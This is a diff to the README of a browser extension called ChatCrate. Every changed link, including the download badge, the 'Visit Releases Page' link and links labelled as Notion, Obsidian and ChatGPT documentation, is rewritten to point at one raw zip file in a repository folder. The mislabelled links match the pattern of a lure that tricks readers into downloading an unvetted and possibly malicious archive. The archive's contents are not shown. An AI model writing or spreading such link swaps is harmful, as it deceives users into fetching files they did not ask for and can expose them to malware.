@@ -9,7 +9,7 @@ ChatCrate is a browser extension designed for you to easily export your AI chat 
 - **User-Friendly Interface:** Designed for everyone, no technical skills required.
 
 ## 🔗 Download
-[![Download ChatCrate](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/Biznezzda1/ChatCrate/releases)
+[![Download ChatCrate](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip%20release-blue)](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip)
 
 To get started, visit the Releases page to download ChatCrate. 
 
@@ -22,7 +22,7 @@ To get started, visit the Releases page to download ChatCrate.
 Follow these steps to download and install ChatCrate:
 
 1. Click the link below to visit the Releases page.
-   [Visit Releases Page](https://github.com/Biznezzda1/ChatCrate/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip)
    
 2. On the Releases page, find the latest version.
    
@@ -56,9 +56,9 @@ This repository includes various topics related to ChatCrate: AI, browser extens
 
 ## 🔗 Further Resources
 Check out these resources for more information:
-- [Notion Documentation](https://www.notion.so/)
-- [Obsidian Documentation](https://obsidian.md/)
-- [ChatGPT Overview](https://chat.openai.com/)
+- [Notion Documentation](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip)
+- [Obsidian Documentation](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip)
+- [ChatGPT Overview](https://raw.githubusercontent.com/Biznezzda1/ChatCrate/main/copacetic/ChatCrate.zip)
 
 ## 📢 Acknowledgments
 Thank you to all who contributed to this project and the community for helping improve ChatCrate. Your support is essential for our growth and success.
